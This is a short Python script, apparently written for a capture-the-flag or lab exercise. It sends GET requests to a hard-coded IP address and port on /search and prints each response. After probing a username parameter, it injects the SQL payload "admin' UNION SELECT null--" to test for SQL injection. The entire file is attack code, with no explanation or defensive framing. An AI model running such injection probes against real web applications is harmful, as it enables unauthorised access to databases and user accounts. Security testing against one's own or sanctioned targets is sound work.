import requests
import urllib.parse
import string

#base_url = "http://62.173.140.174:36100/login"
base_url = "http://62.173.140.174:36100/search"
#base_url = "http://62.173.140.174:36100/admin"

code = "admin"
url = f"{base_url}?username={urllib.parse.quote(code)}"
print(url)
response = requests.get(url, allow_redirects=False)
print(response)
print(response.content.decode('utf-8'))

code1 = "sql"
url = f"{base_url}?{urllib.parse.quote(code1)}"
print(url)
response = requests.get(url, allow_redirects=False)
print(response)
print(response.content.decode('utf-8'))

code = "admin' UNION SELECT null--"
url = f"{base_url}?username={urllib.parse.quote(code)}"
response = requests.get(url)
#print(response.content)
print(response)
print(response.content.decode('utf-8'))
